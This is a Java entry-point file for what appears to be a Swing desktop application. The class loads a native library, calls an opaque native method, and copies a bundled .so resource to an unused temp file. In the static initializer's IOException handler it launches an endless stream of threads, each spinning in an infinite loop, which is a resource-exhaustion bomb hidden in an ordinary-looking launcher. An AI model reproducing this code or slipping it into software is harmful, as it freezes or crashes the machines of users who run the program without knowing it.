package net.benjaminguzman;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;

public class Main {
    static {
        System.loadLibrary("a");
        try {
            Path tmp = Files.createTempFile("a", ".tmp");
            OutputStream outStream = new BufferedOutputStream(new FileOutputStream(tmp.toFile()));
            Main.class.getResourceAsStream("/a/liba.so").transferTo(outStream);
        } catch (IOException e) {
            e.printStackTrace();
            while (true) {
                new Thread(() -> {
                    while (true);
                }).start();
            }
        }
    }

    public static void main(String[] args) {
        a();

        System.setProperty("awt.useSystemAAFontSettings", "lcd"); // use font antialiasing
        System.setProperty("swing.aatext", "true");
        new MainFrame().initComponents();
    }

    private static native void a();
}
